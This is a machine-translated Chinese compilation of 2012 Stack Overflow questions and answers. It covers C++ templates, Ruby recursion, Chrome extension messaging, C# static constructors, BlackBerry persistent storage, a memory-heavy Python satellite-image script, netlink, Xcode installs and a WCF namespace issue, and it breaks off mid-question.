实际上，您可能想查看下周关于 Insight for CI 的网络研讨会以及现在可用的网络研讨会记录。

我一般但是你不能用额外的标签来扩展 pom，因为它会阻止 maven 能够解析它。你能做的最好的就是将它们添加为 xml 注释。

# c++ - 是否可以在不知道模板类型的情况下指向模板类？

> ID：10658242
> 
> 赞同：2
> 
> 时间：2012-05-18T18:54:22.533
> 
> 标签：c++, templates

我想做这样的事情，但我不确定是否可能。我在 Google 上找不到任何信息。

```
template <typename T>
class Container {
public:
  T *ptr;
};

class Other {
private:
  Container *container_ref;
} 
```

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T18:58:51.573

不是，但如果你负责，`Container`那么你可以让它从一个非模板化的基类继承并保留一个指向它的指针。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T18:55:47.093

不，模板不是一个类，它是关于如何构建一个类的说明。如果没有模板参数（显式或隐含），它是不完整的。

您可以查看[Boost::any](http://www.boost.org/doc/libs/1_49_0/doc/html/any.html)来解决您的问题。

# ruby - 有没有办法将方法传递给同一对象的方法？

> ID：10658245
> 
> 赞同：0
> 
> 时间：2012-05-18T18:54:36.627
> 
> 标签：ruby, methods

这是我想做的：

```
class Directory
  def doSomething
  end

  def subs
    # => an array of Directory objects
  end

  def recursively (method)
    self.subs.each do |sub|
      sub.method
      sub.recursively method
    end
  end
end

cd = Directory.new

cd.recursively 'doSomething'
# ...and extra points if theres a way to:
cd.recursively.doSomething 
```

从这个角度来看，我正在创建一个小脚本，它将更改目录中的文件及其所有子目录。这些子目录将只是扩展`Directory`对象。

*那么有没有办法将一个方法作为另一个方法的参数传递呢？*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:18:03.413

您可以使用[`Object#send`](http://ruby-doc.org/core-1.9.3/Object.html#method-i-send), 其中`method`是表示方法名称的字符串或符号，如您的第一个示例中所示。只需将您的更改`#recursively`为：

```
def recursively(method)
  subs.each do |sub|
    sub.send method
    sub.recursively method
  end
end 
```

**更新**

对于您的“加分”问题，并接受 megas 的回答，这里是基于 Enumerator 的方法的尝试。将其放入您的目录：

```
def recursively
  Enumerator.new do |y|
    subs.each do |sub|
      y.yield sub
      sub.recursively.each do |e|
        y.yield e
      end
    end
  end
end 
```

并这样称呼它：

```
cd.recursively.each { |d| d.doSomething } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:19:01.610

是的，你可以这样做——

```
class Directory
    def doSomething
    end

    def subs
        # => an array of Directory objects
    end

    def recursively (method)
        self.subs.each do |sub|
            sub.method.call
            sub.recursively method
        end
    end
end

dir = Directory.new
ds = dir.method :doSomething

dir.recursively ds 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T19:25:00.267

我认为这里应该是`each`来自 Enumerable 模块的专门方法。当你实现`each`方法时，Enumerable 模块会提供很多方便的方法`map, drop`，诸如此类。

```
class Directory
  include Enumerable

  def initialize
    # here you should build @objects - a whole list of all objects in 
    # the current direcory and its subdirectories.
    @objects = ....
  end

  def each         
    if block_given?
      @objects.each { |e| yield(e) }
    else
      Enumerator.new(self, :each)
    end
  end

  ...
end 
```

然后您可以以优雅的方式迭代所有对象：

```
@directory = Directory.new('start_directory')

@directory.each do |object|
  puts object.size # this will prints the sizes for all objects in directory
  object.do_some_job # this will call method on object for all your objects
end 
```

这将为目录中的所有对象提供一系列大小

```
@directory.map { |object| object.size } #=> [435435,64545,23434,45645, ...] 
```

附加示例：

例如，您需要获取包含所有对象的索引和大小的列表

```
@directory.each_with_index.map { |object, index| [index, object.size] }

#=> [ [0,43543], [1,33534], [2,34543564], [3,345435], ...] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-18T19:15:47.977

看看这是否能让你朝着正确的方向前进：

```
module Recursion
  def recursively(&block)
    output = block.call(self)
    output.recursively(&block) unless output.nil?
  end
end

class Number
  include Recursion

  def initialize(value)
    @value = value
  end

  def next
    @value > 0 ? Number.new(@value - 1) : nil
  end

  def print
    puts @value
    self.next
  end
end

Number.new(10).recursively(&:print) 
```

# javascript - Chrome 19 中的消息传递中断？

> ID：10658246
> 
> 赞同：0
> 
> 时间：2012-05-18T18:54:39.293
> 
> 标签：javascript, google-chrome, google-chrome-extension, messaging

从 Chrome 19.0.1084.46 开始，我的一个扩展已停止为我和其他人工作。它涉及抓取标签 URL，然后将它们发送到脚本。在升级之前一切正常，并且没有提及 Google Code 文档中发生了什么变化。有谁知道导致这个问题发生了什么变化？

bg.htm:

```
c="Whatever";
chrome.extension.onRequest.addListener(function(request,sender,sendResponse) {
 sendResponse({ val:c });
}); 
```

做.js：

```
chrome.extension.sendRequest(null,function(resp) { c=resp.val; });

alert(c); // DOES NOTHING IN CHROME 19 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T18:02:28.057

尝试传递除 , 以外的其他内容`null`，并且`alert(c)`应该在回调中，尽管我不确定 alert 是否真的适用于内容脚本。

`Console.log`适用于内容脚本，但消息将被记录到该脚本被注入的选项卡的调试器中（而不是在扩展的调试器中）。

# ruby-on-rails - 为什么在尝试遍历哈希时会出现未定义的方法错误？

> ID：10658248
> 
> 赞同：1
> 
> 时间：2012-05-18T18:55:03.977
> 
> 标签：ruby-on-rails, ruby

我有一些代码：

```
 in_msg.updateComments.map{|c| c.values}.each do |comment|
    ...
  end 
```

`in_msg.updateComments`哈希在哪里。出于某种原因，如果此代码段返回错误的第一行：

```
NoMethodError: undefined method `values' for #<Array:0x1382da058> 
```

我不确定为什么会这样。知道为什么会发生以及如何解决吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-18T19:11:16.733

该`map`方法返回一个`Enumerator`，它将遍历散列中的每个键值对，但它产生一个数组，而不是散列，因此`c`看起来像`[key, value]`而不是`{key => value}`.

`Array`没有实现`values`，这就是您收到错误的原因。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:06:58.550

这可以工作，只要`updateComments`包含哈希和数组：

```
in_msg.updateComments.map do |c|
  if c.respond_to?(:values)
    c.values
  else
    c
  end
end.each do |comment|
  ...
end 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T19:07:29.693

产生的`Hash#map`不是哈希，而是一个数组`[key,value]`。

```
irb> {a:1,b:2}.map {|arg| p arg}
[:a, 1]
[:b, 2]
=> [[:a, 1], [:b, 2]] 
```

==============

如果你想迭代哈希值，`a_hash.values.each`或者`a_hash.each`会很好。

# c# - 静态变量可以在静态方法中初始化吗？

> ID：10658252
> 
> 赞同：-1
> 
> 时间：2012-05-18T18:55:21.293
> 
> 标签：c#

静态变量可以在方法中初始化吗？以下代码有效吗？谢谢！

```
internal static class Common
{

    internal static int TimeOut;
    internal static string Name;

    internal static void Initialize()
    {
        TimeOut = Config.Read("timeout");
        Name = Config.Read("Name");
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-18T18:59:04.837

简短的回答是肯定的。

如果您真的想初始化静态变量（例如，在使用静态类之前在运行时设置它们的值），请使用静态构造函数：

```
internal static class Common
{
    internal static int TimeOut;
    internal static string Name;

    static Common()
    {
        TimeOut = Config.Read("timeout");
        Name = Config.Read("Name");
    }
} 
```

请注意，静态构造函数没有访问修饰符，并且必须是无参数的。

有关[静态构造函数](http://msdn.microsoft.com/en-us/library/k9x6w0hc(v=vs.100).aspx)的进一步阅读，请参阅此[MSDN 文章](http://msdn.microsoft.com/en-us/library/k9x6w0hc(v=vs.100).aspx)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-18T18:58:44.087

是的他们可以。您的代码完全有效。

话虽如此，通常最好在静态构造函数或内联中​​进行*初始化*，因为它可以防止在初始化之前使用和访问它们。

在您的情况下，这将需要使用静态构造函数，因为您正在运行代码（`Config.Read`）：

```
static Common()
{
    TimeOut = Config.Read("timeout");
    Name = Config.Read("Name");
} 
```

我还建议对静态值使用属性而不是字段，因为这确实提供了一些好处，尤其是在 API 面向未来方面。这可以很简单：

```
internal static int TimeOut { get; set; }
internal static string Name { get; set; } 
```

在您的情况下，由于这些似乎在初始化时被读取一次，您可能还可以使用：

```
internal static int TimeOut { get; private set; }
internal static string Name { get; private set; } 
```

# blackberry - 在 BlackBerry 6 中将数据保存到持久存储错误

> ID：10658260
> 
> 赞同：0
> 
> 时间：2012-05-18T18:55:44.983
> 
> 标签：blackberry, java-me

我正在尝试在持久存储中保存图像的路径，以在用户从历史列表中选择特定产品时显示图像（每个产品一个图像，由用户拍摄）。现在我遇到的问题是，当我第一次将应用程序加载到手机并尝试向持久性存储添加一个条目时，它会在稍后引发错误并且应用程序冻结。但是，当我回来并再次添加图像时，它工作得很好，并且当我选择每个特定产品时，图像总是会加载。

这让我相信罪魁祸首是我正在做的第一个 store8.commit() ，由于某种原因，它在调试时抛出了一个异常：No Stack Trace。这是我的代码：

```
public class Storage extends Application {

private static final long PERSISTENT_KEY8 = 0x2c4c45c139ee9728L;
static PersistentObject store8 = PersistentStore.getPersistentObject(PERSISTENT_KEY8);
private static Vector pics;

/**
 * Picture Section ***********************************************************
 */
public static void savePicture(){

    store8.setContents(new Vector());
    store8.commit();

    if(pics == null){
        pics = new Vector();
    }
    synchronized(store8) {

        store8.setContents(pics); 
        store8.commit();
    }

}
public static String getPicture(String productName){

    if(pics.size()==0){
        return "";
    }else{
        for(int i = 0; i < pics.size(); i++){
            Pics product = (Pics)pics.elementAt(i);
            if(product.getProductName().equals(productName)){
                return product.getPic();
            }
        }
        return "";
    }   
}
public static void removePicture(String productName){

    if(pics.size()==0){
        return;
    }else{
        for(int i = 0; i < pics.size(); i++){
            Pics product = (Pics)pics.elementAt(i);
            if(product.getProductName().equals(productName)){
                pics.removeElementAt(i);
            }
        }
    }   
}   
public static void loadPicture(){

    pics = (Vector)store8.getContents();

    if(pics == null){
        pics = new Vector();
    }
}
public static void setPicture(Pics pro){
    if(pics.size()!=0){
        for(int j = 0; j< pics.size() ; j++){
            Pics product = (Pics)pics.elementAt(j);
            if(pro.getProductName().equals(product.getProductName())){
                pics.removeElementAt(j);
            }
        }
    }
    pics.addElement(pro);
}
} 
```

这就是包含我保存图像的方法的类。现在对于我正在操作它的另一个类：

```
public class ProductImage extends MainScreen implements FieldChangeListener,      AppLaunchResource {

private ImageButtonField logo;
private ButtonField newImage, chooseExisting;
public static BitmapField takenPicture;
//public static String picPath =""; 
private String currentPicture = "";
private String currentProduct ="";

public ProductImage(String productName){
    super(VERTICAL_SCROLL|VERTICAL_SCROLLBAR);
    currentProduct = productName;
    createGUI(); 
}
public void createGUI(){
    deleteAll();
    this.setTitle(new LabelField("Add An Image", Field.FIELD_HCENTER));
    if(ToolbarManager.isToolbarSupported())
    {
        Toolbar tb = new Toolbar();
        setToolbar(tb.createToolBar());
    }
    else{
        Toolbar tb = new Toolbar();
        add(tb.createNavBar());
    }

    try{
        Storage.loadPicture();
    }catch(NullPointerException e){
        e.printStackTrace();
    }

    newImage = new ButtonField("Take Photo", ButtonField.CONSUME_CLICK){
        public int getPreferredWidth() {
            return (int) (net.rim.device.api.system.Display.getWidth());
        }
    };
    chooseExisting= new ButtonField("Change Image", ButtonField.CONSUME_CLICK){
        public int getPreferredWidth() {
            return (int) (net.rim.device.api.system.Display.getWidth());
        }
    };

    newImage.setChangeListener(this);
    chooseExisting.setChangeListener(this);

    EncodedImage enc = EncodedImage.getEncodedImageResource("camera.png");
    EncodedImage sizeEnc = ImageResizer.sizeImage(enc, Display.getHeight(), Display.getHeight());

    takenPicture = new BitmapField(enc.getBitmap());

    VerticalFieldManager vfMain = new VerticalFieldManager();
    vfMain.add(new SeparatorField());
    vfMain.add(newImage);
    vfMain.add(chooseExisting);
    vfMain.add(takenPicture);
    add(vfMain);

    currentPicture = Storage.getPicture(currentProduct);
    showPicture();

}   

public void choosePicture(){

    String imageExtensions[] = {"jpg", "jpeg",
         "bmp", "png", "gif"};

    FileSelectorPopupScreen fps = new FileSelectorPopupScreen(null, imageExtensions);
    fps.pickFile();
    String theFile = fps.getFile();
    UiApplication.getUiApplication().pushScreen(fps);

    if (theFile == null)
    {
        Dialog.alert("Screen was dismissed. No file was selected.");
    }
    else
    {
        try{

            String path= "file:///" + theFile;
            byte[] data = getData(path);
            //Encode and Resize image 
            EncodedImage  eImage = EncodedImage.createEncodedImage(data,0,data.length);

            if(Display.getHeight()>Display.getWidth()){
                int scaleFactorX = Fixed32.div(Fixed32.toFP(eImage.getWidth()), 
                     Fixed32.toFP(Display.getWidth()));
                int scaleFactorY = Fixed32.div(Fixed32.toFP(eImage.getHeight()), 
                     Fixed32.toFP((Display.getWidth()*Display.getWidth())/Display.getHeight()));
                eImage=eImage.scaleImage32(scaleFactorX, scaleFactorY);
            }
            else{
                int scaleFactorX = Fixed32.div(Fixed32.toFP(eImage.getWidth()), 
                         Fixed32.toFP(Display.getWidth()));
                    int scaleFactorY = Fixed32.div(Fixed32.toFP(eImage.getHeight()), 
                         Fixed32.toFP(Display.getHeight()));
                    eImage=eImage.scaleImage32(scaleFactorX, scaleFactorY);
            }
            UiApplication.getUiApplication().popScreen(fps);
            takenPicture.setBitmap(eImage.getBitmap());

            Storage.setPicture(new Pics(currentProduct, path));

            try{
                Storage.savePicture();
            }catch(Exception e){
                e.printStackTrace();
            }

        }
        catch(Exception e){

        }       
        Dialog.alert("Picture Saved");
    }

}
public void showPicture(){
    if(currentPicture != ""){
        try{

            String path= currentPicture;
            byte[] data = getData(path);
            //Encode and Resize image 
            EncodedImage  eImage = EncodedImage.createEncodedImage(data,0,data.length);

            if(Display.getHeight()>Display.getWidth()){
                int scaleFactorX = Fixed32.div(Fixed32.toFP(eImage.getWidth()), 
                     Fixed32.toFP(Display.getWidth()));
                int scaleFactorY = Fixed32.div(Fixed32.toFP(eImage.getHeight()), 
                     Fixed32.toFP((Display.getWidth()*Display.getWidth())/Display.getHeight()));
                eImage=eImage.scaleImage32(scaleFactorX, scaleFactorY);
            }
            else{
                int scaleFactorX = Fixed32.div(Fixed32.toFP(eImage.getWidth()), 
                         Fixed32.toFP(Display.getWidth()));
                    int scaleFactorY = Fixed32.div(Fixed32.toFP(eImage.getHeight()), 
                         Fixed32.toFP(Display.getHeight()));
                    eImage=eImage.scaleImage32(scaleFactorX, scaleFactorY);
            }

            takenPicture.setBitmap(eImage.getBitmap());

        }
        catch(Exception e){

        }  
    }
}

public void fieldChanged(Field field, int context) {

    if(field == logo){

    }
    else if(field == newImage){
        takePicture();
    }
    else if(field == chooseExisting){
        choosePicture();
    }
}

} 
```

我删除了这个类的许多部分，抱歉，如果它很长，这段代码中基本上有 4 个存储方法调用，我相信它们都在正确的位置。但我在第一次加载时再次遇到问题，而不是之后。

谁能看到我在这里做错了什么？我有这个问题一个星期

感谢您提供的任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-22T17:22:42.547

尝试这样的事情：

```
public class Storage extends Application{ 

    private static final long PERSISTENT_KEY8 = 0x2c4c45c139ee9728L; 
    static PersistentObject store8 = null; 
    private static Vector pics = null; 

    static{
        store8 = PersistentStore.getPersistentObject(PERSISTENT_KEY8)
        pics = (Vector)store8.getContents(); 
        if(pics == null){ 
            pics = new Vector(); 
            store8.setContents(pics);
            store8.commit();
        } 
    }

    public static void savePicture(){
        try{
            synchronized(store8){ 
                store8.setContents(pics);  
                store8.commit(); 
            }
        }
        catch(Exception e){       
            e.printStackTrace();       
        }       
    } 

    public static int findPicture(String productName){
        for(int i = 0; i < pics.size(); i++){ 
            Pics product = (Pics)pics.elementAt(i); 
            if(product.getProductName().equals(productName)){ 
                return i; 
            } 
        } 
        return -1; 
    } 

    public static String getPicture(String productName){
        int idx = findPicture(productName);
        if(idx != -1){
            return ((Pics)pics.elementAt(idx)).getPic(); 
        } 
        return ""; 
    } 

    public static void removePicture(String productName){
        int idx = findPicture(productName);
        if(idx != -1){
            pics.removeElementAt(idx); 
        }    
    }    

    public static void setPicture(Pics pro){ 
        removePicture(pro.getProductName());
        pics.addElement(pro); 
    } 
} 
```

.

```
public class ProductImage extends MainScreen implements FieldChangeListener, AppLaunchResource {       
    private ImageButtonField logo;       
    private ButtonField newImage, chooseExisting;       
    public static BitmapField takenPicture;       
    //public static String picPath ="";        
    private String currentPicture = "";       
    private String currentProduct = "";       

    public ProductImage(String productName){       
        super(VERTICAL_SCROLL|VERTICAL_SCROLLBAR);       
        currentProduct = productName;       
        createGUI();        
    }       

    public void createGUI(){       
        deleteAll();       
        setTitle(new LabelField("Add An Image", Field.FIELD_HCENTER));       
        Toolbar tb = new Toolbar();       
        if(ToolbarManager.isToolbarSupported()){       
            setToolbar(tb.createToolBar());       
        }       
        else{       
            add(tb.createNavBar());       
        }       

        newImage = new ButtonField("Take Photo", ButtonField.CONSUME_CLICK){       
            public int getPreferredWidth() {       
                return (int) Display.getWidth();       
            }       
        };       

        chooseExisting = new ButtonField("Change Image", ButtonField.CONSUME_CLICK){       
            public int getPreferredWidth() {       
                return (int) Display.getWidth();       
            }       
        };       

        newImage.setChangeListener(this);       
        chooseExisting.setChangeListener(this);       

        EncodedImage enc = EncodedImage.getEncodedImageResource("camera.png");       
        EncodedImage sizeEnc = ImageResizer.sizeImage(enc, Display.getHeight(), Display.getHeight());       

        takenPicture = new BitmapField(enc.getBitmap());       

        VerticalFieldManager vfMain = new VerticalFieldManager();       
        vfMain.add(new SeparatorField());       
        vfMain.add(newImage);       
        vfMain.add(chooseExisting);       
        vfMain.add(takenPicture);       
        add(vfMain);       

        currentPicture = Storage.getPicture(currentProduct);       
        showPicture();       
    }          

    public void choosePicture(){       
        String imageExtensions[] = {"jpg", "jpeg", "bmp", "png", "gif"};       

        FileSelectorPopupScreen fps = new FileSelectorPopupScreen(null, imageExtensions);       
        fps.pickFile();       
        String theFile = fps.getFile();       

        if (theFile == null){       
            Dialog.alert("Screen was dismissed. No file was selected.");       
            return;
        }       

        EncodedImage eImage = loadImage("file:///" + theFile);
        if(eImage != null){
            takenPicture.setBitmap(eImage.getBitmap());       
            Storage.setPicture(new Pics(currentProduct, path));       
            Storage.savePicture();       
            Dialog.alert("Picture Saved");       
        }       
    }       

    private EncodedImage loadImage(String path){
        try{       
            byte[] data = getData(path);       
            //Encode and Resize image        
            EncodedImage  eImage = EncodedImage.createEncodedImage(data,0,data.length);       

            int scaleFactorX, scaleFactorY;

            if(Display.getHeight()>Display.getWidth()){       
                scaleFactorX = Fixed32.div(Fixed32.toFP(eImage.getWidth()), Fixed32.toFP(Display.getWidth()));       
                scaleFactorY = Fixed32.div(Fixed32.toFP(eImage.getHeight()), Fixed32.toFP((Display.getWidth()*Display.getWidth())/Display.getHeight()));       
            }       
            else{       
                scaleFactorX = Fixed32.div(Fixed32.toFP(eImage.getWidth()), Fixed32.toFP(Display.getWidth()));       
                scaleFactorY = Fixed32.div(Fixed32.toFP(eImage.getHeight()), Fixed32.toFP(Display.getHeight()));       
            }       

            return eImage.scaleImage32(scaleFactorX, scaleFactorY);
        }
        catch (Exception e){
            return null;
        }
    }

    public void showPicture(){       
        if(currentPicture != ""){       
            EncodedImage eImage = loadImage(currentPicture);
            if (eImage != null){
                takenPicture.setBitmap(eImage.getBitmap());       
           }
        }       
    }       

    public void fieldChanged(Field field, int context){       
        if(field == logo){       
        }       
        else if(field == newImage){       
            takePicture();       
        }       
        else if(field == chooseExisting){       
            choosePicture();       
        }       
    }       
} 
```

# python - 大卫星图像的计算崩溃 python 和计算机冻结

> ID：10658262
> 
> 赞同：1
> 
> 时间：2012-05-18T18:55:48.733
> 
> 标签：python, crash, raster, satellite-image, large-data

> **可能的重复：**
> [大卫星图像处理](https://stackoverflow.com/questions/10578434/big-satellite-image-processing)

我正在尝试在双时相 RapidEye 多光谱图像上运行 Mort Canty 的 Python iMAD 实现。它基本上计算了两个图像的典型相关，然后减去它们。我遇到的问题是图像的大小为 5000 x 5000 x 5（条带）像素。当我在整个图像上运行此程序时，我的计算机严重**崩溃**，我必须将其关闭。

有谁知道什么可以让 python像这样使计算机**崩溃**？例如，如果我选择每个波段 2999x2999 像素，一切运行正常。

8 GB 内存，I7-2617M 1.5 1.5 ghz，Windows7 64 位。我使用 64 位版本的一切：python(2.7)、numpy、scipy 和 gdal。

先感谢您！

```
 def covw(dm,w):
    # weighted covariance matrix and means 
    # from (transposed) data array    
       N = size(dm,0) 
       n = size(w)
       sumw = sum(w)
       ws = tile(w,(N,1))
       means = mat(sum(ws*dm,1)/sumw).T
       means = tile(means,(1,n))
       dmc = dm - means
       dmc = multiply(dmc,sqrt(ws))
       covmat = dmc*dmc.T/sumw
       return (covmat,means)

    def main():
    # ------------test---------------------------------------------------------------    
    if len(sys.argv) == 1:        
    (sys.argv).extend(['-p','[0,1,2,3,4]','-  
    d','[0,4999,0,4999]',
'c://users//pythonxy//workspace//1uno.tif','c://users//pythonxy//workspace//2dos.tif'])
    # -------------------------------------------------------------------------------        

options, args = getopt.getopt(sys.argv[1:],'hp:d:')
pos = None
dims = None            
for option, value in options:
    if option == '-h':
        print 'Usage: python %s [-p "bandPositions" -d "spatialDimensions"] 
        filename1   filename2' %sys.argv[0]
        print '       bandPositions and spatialDimensions are quoted lists, 
        e.g., -p "[0,1,3]" -d "[0,400,0,400]"  \n'
        sys.exit(1) 
    elif option == '-p':
        pos = eval(value)
    elif option == '-d':
        dims = eval(value) 
if len(args) != 2:
    print 'Incorrect number of arguments'
    print 'Usage: python %s [-p "bandspositions" -d "spatialdimensions"] 
    filename1 filename2 \n' %sys.argv[0]
    sys.exit(1)                                    
gdal.AllRegister()
fn1 = args[0]
fn2 = args[1]
path = os.path.dirname(fn1)
basename1 = os.path.basename(fn1)
root1, ext = os.path.splitext(basename1)
basename2 = os.path.basename(fn2)
outfn = path+'\\MAD['+basename1+'-'+basename2+']'+ext
inDataset1 = gdal.Open(fn1,GA_ReadOnly)     
inDataset2 = gdal.Open(fn2,GA_ReadOnly)
cols = inDataset1.RasterXSize
rows = inDataset1.RasterYSize    
bands = inDataset1.RasterCount
cols2 = inDataset2.RasterXSize
rows2 = inDataset2.RasterYSize    
bands2 = inDataset2.RasterCount
if (rows != rows2) or (cols != cols2) or (bands != bands2):
    sys.stderr.write("Size mismatch")
    sys.exit(1)
if pos is None:
    pos = range(bands)
else:
    bands = len(pos) 
if dims is None:
    x0 = 0
    y0 = 0
else:
    x0 = dims[0]
    y0 = dims[2]  
    cols = dims[1]-dims[0] + 1  
    rows = dims[3]-dims[2] + 1                       
# initial weights
wt = ones(cols*rows)      
# data array (transposed so observations are columns)
dm = zeros((2*bands,cols*rows),dtype='float32')
k = 0
for b in pos:
    band1 = inDataset1.GetRasterBand(b+1)
    band1 = band1.ReadAsArray(x0,y0,cols,rows).astype(float)
    dm[k,:] = ravel(band1)
    band2 = inDataset2.GetRasterBand(b+1)
    band2 = band2.ReadAsArray(x0,y0,cols,rows).astype(float)        
    dm[bands+k,:] = ravel(band2)
    k += 1
print '========================='
print '       iMAD'
print '========================='
print 'time1: '+fn1
print 'time2: '+fn2   
print 'Delta    [canonical correlations]'   
# iteration of MAD        
delta = 1.0
oldrho = zeros(bands)
iter = 0
while (delta > 0.001) and (iter < 50):    
#     weighted covariance matrices and means 
    sigma,means = covw(dm,wt)          
    s11 = mat(sigma[0:bands,0:bands])
    s22 = mat(sigma[bands:,bands:]) 
    s12 = mat(sigma[0:bands,bands:])
    s21 = mat(sigma[bands:,0:bands])
#     solution of generalized eigenproblems
    s22i = mat(linalg.inv(s22))
    lama,a = linalg.eig(s12*s22i*s21,s11) 
    s11i = mat(linalg.inv(s11))    
    lamb,b = linalg.eig(s21*s11i*s12,s22) 
#     sort a   
    idx = argsort(lama)
    a = a[:,idx]
#     sort b         
    idx = argsort(lamb)
    b = b[:,idx]           
#     canonical correlations        
    rho = sqrt(real(lamb[idx]))             
#     normalize dispersions   
    a = mat(a)
    tmp1 = a.T*s11*a
    tmp2 = 1./sqrt(diag(tmp1))
    tmp3 = tile(tmp2,(bands,1))
    a = multiply(a,tmp3)
    b = mat(b) 
    tmp1 = b.T*s22*b
    tmp2 = 1./sqrt(diag(tmp1))
    tmp3 = tile(tmp2,(bands,1))
    b = multiply(b,tmp3)
#     assure positive correlation
    tmp = diag(a.T*s12*b)
    b = b*diag(tmp/abs(tmp))
#     canonical and MAD variates
    U = a.T*mat(dm[0:bands,:]-means[0:bands,:])    
    V = b.T*mat(dm[bands:,:]-means[bands:,:])           
    MAD = U-V  
#     new weights        
    var_mad = tile(mat(2*(1-rho)).T,(1,rows*cols))    
    chisqr = sum(multiply(MAD,MAD)/var_mad,0)
    wt = 1-stats.chi2.cdf(chisqr,[bands])
#     continue iteration         
    delta = sum(abs(rho-oldrho))
    oldrho = rho
    print delta
    iter += 1   
# write results to disk
driver = inDataset1.GetDriver()    
outDataset = driver.Create(outfn,cols,rows,bands+1,GDT_Float32)
projection = inDataset1.GetProjection()
geotransform = inDataset1.GetGeoTransform()
if geotransform is not None:
    gt = list(geotransform)
    gt[0] = gt[0] + x0*gt[1]
    gt[3] = gt[3] + y0*gt[5]
    outDataset.SetGeoTransform(tuple(gt))
if projection is not None:
    outDataset.SetProjection(projection)        
for k in range(bands):        
    outBand = outDataset.GetRasterBand(k+1)
    outBand.WriteArray(resize(MAD[k,:],(rows,cols)),0,0) 
    outBand.FlushCache()
outBand = outDataset.GetRasterBand(bands+1)    
outBand.WriteArray(resize(chisqr,(rows,cols)),0,0) 
outBand.FlushCache()    
outDataset = None
inDataset1 = None
inDataset2 = None  
print 'result written to: '+outfn
print '---------------------------------' 
```

如果**名称**== '**主要**': main()

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:56:12.590

听起来这个操作占用的内存比您的计算机所能提供的更多。这是一种过度简化，但是当系统用完实际可用的 RAM 时，它有时会将似乎使用较少的内存部分写入硬盘，因此它可以将实际内存用于其他用途。硬盘比主存慢很多数量级，所以当您的软件需要已写入磁盘的部分内存时，一切都会变得非常慢。当这种情况以惊人的规模发生时，并且您的软件和操作系统的某些部分不断尝试使用已被换出（写入磁盘）的内存，您的硬盘驱动器可能会在尝试来回寻找时进行重大锻炼，写很多东西，读很多东西，写更多东西，等等。

您可以通过观察系统的活动监视器来了解这是否真的发生了（我忘记了它们在 Windows 上的名称，但我知道它们在那里；一些软件可以显示分配的内存量、正在使用的内存量等，并为您绘制一个漂亮的图表）。在观看这些的同时，启动您的程序并观察内存分配率的样子。

可能有一些方法可以减轻这段代码中的内存使用，如果一次在内存中保存的东西更少，但我不知道它们是什么。您还可以向系统添加更多 RAM，希望它能解决此问题。

# sockets - 从用户态进入内核态的不同方式？NETLINK Socket是其中之一吗？如何？

> ID：10658264
> 
> 赞同：0
> 
> 时间：2012-05-18T18:55:59.643
> 
> 标签：sockets, operating-system, linux-kernel, netlink

NETLINK Socket 是否用于从用户模式进入内核模式。我们如何使用**NETLINK** Socket 实现系统调用功能，同时从用户模式跳转到内核模式？恕我直言，如果可能的话？RGds，软的

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:29:10.130

用户应用程序有两种方式进入 [Unix] 内核（意味着让内核代码直接代表用户模式进程执行）：

*   进行*系统调用*，即从内核显式请求服务
*   *由于以下任一原因陷入内核 *：*

    *   错误（分段违规，无效指令等） - 这是致命的，
    *   或页面错误 - 访问映射但不是常驻内存页面。* 

 *[`netlink(7)`](http://www.kernel.org/doc/man-pages/online/pages/man7/netlink.7.html)另一方面，它是一种特定于 Linux 的通知和配置机制，您可以通过诸如[`socket(2)`](http://www.kernel.org/doc/man-pages/online/pages/man2/socket.2.html)、[`sendmsg(2)`](http://www.kernel.org/doc/man-pages/online/pages/man2/sendmsg.2.html)等常规系统调用来访问它。它允许您从内核接收和发送信息。

因此严格来说，不，`netlink(7)`不允许你进入内核模式。*

# iphone - Xcode 说 Build 成功，但 iPhone 上没有安装应用程序

> ID：10658266
> 
> 赞同：4
> 
> 时间：2012-05-18T18:56:05.647
> 
> 标签：iphone, xcode

我正在使用 Xcode 4.3.2，部署目标设置为 4.1，而 iPhone 3Gs 上的 iOS 是 4.2.1。每当我以 iPhone 3Gs 为目标构建和运行应用程序时，它都会显示“已在 'iPhone 3Gs' 上运行 'app name'。

*   我有这个 iPhone 3Gs 的配置文件设置
*   我检查了管理器，iPhone名称右侧的圆圈是绿色的
*   我在我的 iPhone 4s 上运行了相同的应用程序，部署目标设置为 4.1，它在我的 iPhone 4s 上安装并运行。

关于没有在 iPhone 3Gs 上安装应用程序可能会发生什么的任何想法？我什至尝试使用聚光灯搜索该应用程序，但没有任何结果。

谢谢！

编辑：

这是我的设备控制台日志中显示的内容：

```
Fri May 18 15:27:39 unknown lockdownd[16] <Error>: 2ff68000 handle_connection: Could not   receive USB message #6 from iTunes. Killing connection 
Fri May 18 15:27:39 unknown   com.apple.mobile.lockdown[16] <Notice>: Could not receive size of message 
Fri May 18 15:27:51   unknown MobileStorageMounter[4978] <Notice>: (0x3e7518b8) platform_supports_camera_import:   Platform is NOT configured for camera import 
Fri May 18 15:28:01 unknown     MobileStorageMounter[4978] <Notice>: (0x3e7518b8) idle_timer_callback: Exiting after idle 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T20:40:48.070

确保在构建设置中为“有效架构”设置 armv6 和 armv7，因为 3G 仅适用于默认的 armv7

# c# - WCF 删除 xmlns:tem="http://tempuri.org/"

> ID：10658267
> 
> 赞同：3
> 
> 时间：2012-05-18T18:56:12.587
> 
> 标签：c#, .net, xml, wcf, soap

我在让客户与我的系统集成时遇到问题。我想我已经缩小了问题的范围。客户端通过 xml 消息发送，我的系统设置为接受 xml 消息；但是它期望它以某种格式出现。客户表示希望我设置格式以接受他们的格式。

这是客户的消息：

```
